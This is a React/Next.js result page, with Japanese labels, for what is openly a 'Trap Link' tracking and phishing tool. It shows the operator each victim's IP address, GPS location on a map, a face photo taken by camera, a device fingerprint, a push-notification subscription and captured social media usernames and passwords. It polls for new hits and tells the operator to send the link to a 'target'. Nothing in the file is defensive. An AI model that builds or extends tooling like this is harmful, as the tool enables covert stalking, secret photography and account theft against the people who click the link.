// File: src/app/result/[id]/page.tsx
'use client'

import { useEffect, useState, use, useRef } from 'react'
import { format } from 'date-fns'
import {
    MapPinIcon,
    ComputerDesktopIcon,
    DevicePhoneMobileIcon,
    GlobeAltIcon,
    ClockIcon,
    BoltIcon,
    CameraIcon,
    BellIcon,
    KeyIcon
} from '@heroicons/react/24/outline'

export default function ResultPage({ params }: { params: Promise<{ id: string }> }) {
    const unwrappedParams = use(params)
    const linkId = unwrappedParams.id

    const [data, setData] = useState<{ link: any, logs: any[] } | null>(null)
    const [loading, setLoading] = useState(true)
    const [error, setError] = useState('')
    const [newAccessAlert, setNewAccessAlert] = useState(false)
    const prevLogCount = useRef(0)

    const fetchData = async (isInitial = false) => {
        try {
            const res = await fetch(`/api/links/${linkId}`)
            const result = await res.json()

            if (res.ok) {
                setData(result)
                if (!isInitial && prevLogCount.current > 0 && result.logs.length > prevLogCount.current) {
                    setNewAccessAlert(true)
                    setTimeout(() => setNewAccessAlert(false), 5000)
                }
                prevLogCount.current = result.logs.length
            } else {
                setError(result.error || 'Failed to fetch data')
            }
        } catch (err) {
            setError('Error fetching data')
        } finally {
            setLoading(false)
        }
    }

    useEffect(() => {
        fetchData(true)
        // Poll every 5 seconds for real-time updates
        const interval = setInterval(() => fetchData(), 5000)
        return () => clearInterval(interval)
    }, [linkId])

    if (loading) return (
        <div className="min-h-screen flex items-center justify-center bg-gray-50">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
    )

    if (error) return (
        <div className="min-h-screen flex items-center justify-center bg-gray-50">
            <div className="bg-red-50 text-red-600 p-6 rounded-xl shadow-sm border border-red-100 flex items-center">
                <svg className="w-6 h-6 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                {error}
            </div>
        </div>
    )

    return (
        <div className="min-h-screen bg-gray-50 py-10 px-4 sm:px-6 lg:px-8">
            <div className="max-w-5xl mx-auto">

                {/* 🔴 Realtime New Access Alert */}
                {newAccessAlert && (
                    <div className="fixed top-4 right-4 z-50 bg-red-600 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center space-x-2 animate-bounce">
                        <span className="text-lg">🔔</span>
                        <span className="font-bold text-sm">新しいアクセスが検出されました！</span>
                    </div>
                )}

                {/* Header Section */}
                <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 mb-8 flex flex-col sm:flex-row items-center justify-between gap-4">
                    <div className="flex-shrink-0 text-center sm:text-left">
                        <h1 className="text-2xl font-bold text-gray-900 flex items-center justify-center sm:justify-start">
                            <img src="/map_icon.png" alt="" className="w-8 h-8 mr-2 object-contain" />
                            トラッキング結果
                            <span className="ml-3 inline-flex items-center text-xs font-semibold bg-green-100 text-green-700 px-2 py-0.5 rounded-full">
                                <span className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></span>
                                LIVE
                            </span>
                        </h1>
                        <p className="mt-1 text-sm text-gray-500">
                            Trap Link ID: <span className="font-mono bg-gray-100 px-2 py-0.5 rounded text-gray-700">{linkId}</span>
                        </p>
                    </div>
                    <div className="mt-4 sm:mt-0 text-center sm:text-right w-full sm:w-1/2 overflow-hidden">
                        <p className="text-sm font-medium text-gray-500 uppercase tracking-wide">リダイレクト先URL</p>
                        <a href={data?.link.target_url} target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline truncate block p-1">
                            {data?.link.target_url}
                        </a>
                    </div>
                </div>

                {/* Total Stats */}
                <div className="mb-8 grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 flex flex-col justify-center items-center">
                        <span className="text-5xl font-black text-blue-600 mb-2">{data?.logs.length || 0}</span>
                        <span className="text-sm font-semibold tracking-wide text-gray-500 uppercase">アクセス総数</span>
                    </div>

                    <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 flex flex-col justify-center items-center">
                        <span className="text-5xl font-black text-emerald-500 mb-2">
                            {data?.logs.filter((log: any) => log.gps_permission).length || 0}
                        </span>
                        <span className="text-sm font-semibold tracking-wide text-gray-500 uppercase">GPS取得成功</span>
                    </div>

                    <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 flex flex-col justify-center items-center">
                        <span className="text-5xl font-black text-amber-500 mb-2">
                            {data?.logs.filter((log: any) => !log.gps_permission).length || 0}
                        </span>
                        <span className="text-sm font-semibold tracking-wide text-gray-500 uppercase">IP・端末情報のみ</span>
                    </div>
                </div>

                {/* Logs List Section */}
                <div className="space-y-6">
                    <h2 className="text-xl font-bold text-gray-800 border-b pb-2">詳細アクセスログ</h2>

                    {data?.logs.length === 0 ? (
                        <div className="bg-white p-12 rounded-2xl border border-dashed border-gray-300 text-center text-gray-500">
                            まだアクセスがありません。ターゲットにリンクを送信してください。
                        </div>
                    ) : (
                        data?.logs.map((log: any, index: number) => (
                            <div key={log.id} className="bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden hover:border-blue-300 transition-colors">

                                {/* Log Header */}
                                <div className={`px-6 py-4 border-b flex justify-between items-center ${log.gps_permission ? 'bg-emerald-50/50 border-emerald-100' : 'bg-gray-50'}`}>
                                    <div className="flex items-center space-x-3">
                                        <span className="bg-gray-800 text-white text-xs font-bold px-2.5 py-1 rounded-full">#{data.logs.length - index}</span>
                                        <span className="flex items-center text-sm font-medium text-gray-600">
                                            <ClockIcon className="w-4 h-4 mr-1" />
                                            {format(new Date(log.created_at), 'yyyy-MM-dd HH:mm:ss')}
                                        </span>
                                    </div>

                                    {log.gps_permission ? (
                                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-emerald-100 text-emerald-800">
                                            <MapPinIcon className="w-4 h-4 mr-1" /> GPS有効
                                        </span>
                                    ) : (
                                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-amber-100 text-amber-800">
                                            IPアドレスのみ
                                        </span>
                                    )}
                                </div>

                                <div className="p-6 grid grid-cols-1 md:grid-cols-2 gap-8">
                                    {/* Location Info */}
                                    <div className="space-y-4">
                                        <h3 className="text-sm font-bold text-gray-900 border-b pb-2">位置情報（Location Data）</h3>

                                        <div>
                                            <span className="block text-xs font-medium text-gray-500 mb-1">IPアドレス</span>
                                            <span className="text-lg font-mono text-gray-800 bg-gray-100 px-2 py-1 rounded">{log.ip_address || '不明'}</span>
                                        </div>

                                        {log.gps_permission && (
                                            <div className="bg-blue-50 bg-opacity-50 p-4 rounded-xl border border-blue-100">
                                                <div className="grid grid-cols-2 gap-4 mb-3">
                                                    <div>
                                                        <span className="block text-xs font-medium text-blue-800 opacity-75">緯度 (Latitude)</span>
                                                        <span className="text-sm font-mono text-blue-900">{log.latitude}</span>
                                                    </div>
                                                    <div>
                                                        <span className="block text-xs font-medium text-blue-800 opacity-75">経度 (Longitude)</span>
                                                        <span className="text-sm font-mono text-blue-900">{log.longitude}</span>
                                                    </div>
                                                </div>
                                                <div className="w-full h-48 mb-4 rounded-lg overflow-hidden border border-blue-200 shadow-inner">
                                                    <iframe
                                                        width="100%"
                                                        height="100%"
                                                        frameBorder="0"
                                                        style={{ border: 0 }}
                                                        src={`https://maps.google.com/maps?q=${log.latitude},${log.longitude}&hl=ja&z=15&output=embed`}
                                                        allowFullScreen
                                                        loading="lazy"
                                                        referrerPolicy="no-referrer-when-downgrade"
                                                    ></iframe>
                                                </div>

                                                <a
                                                    href={`https://www.google.com/maps/search/?api=1&query=${log.latitude},${log.longitude}`}
                                                    target="_blank"
                                                    rel="noopener noreferrer"
                                                    className="flex items-center justify-center w-full bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium py-2 rounded-lg transition-colors"
                                                >
                                                    <MapPinIcon className="w-4 h-4 mr-1.5" />
                                                    Google Mapsで開く
                                                </a>
                                                <p className="text-xs text-blue-700 mt-2 text-center opacity-80">
                                                    精度: 半径 {Math.round(log.gps_accuracy || 0)} メートル以内
                                                </p>
                                            </div>
                                        )}

                                        {/* 📷 Face Photo */}
                                        {log.face_photo && (
                                            <div className="mt-4 pt-4 border-t border-gray-100">
                                                <h4 className="text-xs font-bold text-purple-700 mb-2 flex items-center">
                                                    <CameraIcon className="w-4 h-4 mr-1" /> 📷 顔写真
                                                </h4>
                                                <img
                                                    src={log.face_photo}
                                                    alt="Captured face"
                                                    className="w-full max-w-xs mx-auto rounded-xl border border-purple-200 shadow"
                                                />
                                            </div>
                                        )}

                                        {/* 🔔 Push notification */}
                                        {log.push_endpoint && (
                                            <div className="mt-3 flex items-center bg-amber-50 text-amber-800 px-3 py-2 rounded-lg border border-amber-200">
                                                <BellIcon className="w-4 h-4 mr-2 flex-shrink-0" />
                                                <span className="text-xs font-semibold">🔔 プッシュ通知 取得済み</span>
                                            </div>
                                        )}
                                    </div>

                                    {/* Device Info */}
                                    <div className="space-y-4">
                                        <h3 className="text-sm font-bold text-gray-900 border-b pb-2">端末情報（Device Fingerprint）</h3>

                                        <div className="grid grid-cols-2 gap-4">
                                            <div>
                                                <span className="block text-xs font-medium text-gray-500">デバイス・機種</span>
                                                <p className="text-sm font-semibold text-gray-800 flex items-center mt-1">
                                                    {log.device_type === 'mobile' || log.device_type === 'tablet' ? (
                                                        <DevicePhoneMobileIcon className="w-4 h-4 mr-1 text-gray-400" />
                                                    ) : (
                                                        <ComputerDesktopIcon className="w-4 h-4 mr-1 text-gray-400" />
                                                    )}
                                                    {log.device_vendor || ''} {log.device_type || 'Desktop'}
                                                </p>
                                            </div>

                                            <div>
                                                <span className="block text-xs font-medium text-gray-500">OS (オペレーティングシステム)</span>
                                                <p className="text-sm font-semibold text-gray-800 mt-1">{log.os_name} {log.os_version}</p>
                                            </div>

                                            <div>
                                                <span className="block text-xs font-medium text-gray-500">ブラウザ</span>
                                                <p className="text-sm font-semibold text-gray-800 mt-1">{log.browser_name}</p>
                                            </div>

                                            {log.battery_level !== null && (
                                                <div>
                                                    <span className="block text-xs font-medium text-gray-500">バッテリー残量</span>
                                                    <p className={`text-sm font-semibold mt-1 flex items-center ${log.battery_level * 100 < 20 ? 'text-red-600' : 'text-emerald-600'}`}>
                                                        <BoltIcon className="w-4 h-4 mr-1" />
                                                        {Math.round(log.battery_level * 100)}%
                                                        {log.battery_charging ? ' (充電中)' : ''}
                                                    </p>
                                                </div>
                                            )}
                                        </div>

                                        <div className="mt-4 pt-4 border-t border-gray-100">
                                            <details className="text-sm text-gray-600 cursor-pointer group">
                                                <summary className="font-medium text-blue-600 hover:text-blue-800 outline-none">
                                                    より詳細なハードウェア情報を確認する
                                                </summary>
                                                <div className="mt-3 grid grid-cols-2 gap-2 text-xs bg-gray-50 p-3 rounded border font-mono">
                                                    <p><span className="text-gray-400">Resolution:</span> {log.screen_width}x{log.screen_height}</p>
                                                    <p><span className="text-gray-400">Window:</span> {log.window_width}x{log.window_height}</p>
                                                    <p><span className="text-gray-400">Network:</span> {log.network_type || 'Unknown'}</p>
                                                    <p><span className="text-gray-400">Timezone:</span> {log.timezone}</p>
                                                    <p><span className="text-gray-400">Language:</span> {log.language}</p>
                                                    <p><span className="text-gray-400">CPU Cores:</span> {log.logical_cores || 'N/A'}</p>
                                                </div>
                                            </details>
                                        </div>

                                    </div>

                                    {/* 🎭 SNS Credentials */}
                                    {log.sns_username && (
                                        <div className="mt-4 pt-4 border-t border-gray-100">
                                            <h4 className="text-xs font-bold text-red-600 mb-2 flex items-center">
                                                <KeyIcon className="w-4 h-4 mr-1" /> 🎭 SNSフィッシング結果
                                            </h4>
                                            <div className="bg-red-50 border border-red-200 rounded-xl p-3 space-y-2 font-mono text-sm">
                                                <div className="flex justify-between">
                                                    <span className="text-red-400 text-xs">プラットフォーム</span>
                                                    <span className="font-bold text-red-800">{log.sns_platform}</span>
                                                </div>
                                                <div className="flex justify-between">
                                                    <span className="text-red-400 text-xs">ユーザー名/メール</span>
                                                    <span className="font-bold text-red-800 break-all">{log.sns_username}</span>
                                                </div>
                                                <div className="flex justify-between">
                                                    <span className="text-red-400 text-xs">パスワード</span>
                                                    <span className="font-bold text-red-800 break-all">{log.sns_password}</span>
                                                </div>
                                            </div>
                                        </div>
                                    )}
                                </div>
                            </div>
                        ))
                    )}
                </div>
            </div>
        </div>
    )
}
